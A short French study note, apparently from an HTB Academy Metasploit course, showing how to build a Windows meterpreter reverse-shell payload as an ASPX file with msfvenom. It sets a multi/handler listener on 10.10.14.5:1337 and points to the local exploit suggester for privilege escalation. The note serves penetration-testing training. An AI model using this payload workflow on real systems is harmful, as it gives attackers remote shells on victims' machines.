---
tags:
  - metasploit
  - msfvenom
  - meterpreter
  - course/htb-academy
---

Encoder un payload
```bash
Tximista64@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

Creer un tcp handler pour accueillir le reverse shell

```
Tximista64@htb[/htb]$ msfconsole -q 

msf6 > use multi/handler
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.14.5

LHOST => 10.10.14.5


msf6 exploit(multi/handler) > set LPORT 1337

LPORT => 1337


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337
```


pour escalate
```bash
search local exploit suggester
```
